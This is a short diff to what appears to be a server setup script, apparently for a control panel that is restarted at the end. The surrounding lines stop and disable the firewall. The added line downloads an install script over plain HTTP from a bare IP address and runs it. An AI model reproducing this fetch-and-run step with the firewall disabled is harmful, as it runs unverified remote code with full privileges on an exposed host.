@@ -55,6 +55,7 @@ firewall-cmd --state
 systemctl stop firewalld.service
 systemctl disable firewalld.service 
 
+yum install -y wget && wget -O install.sh http://128.1.164.196:5880/install/install_6.0.sh && sh install.sh
 
 /etc/init.d/bt restart
 
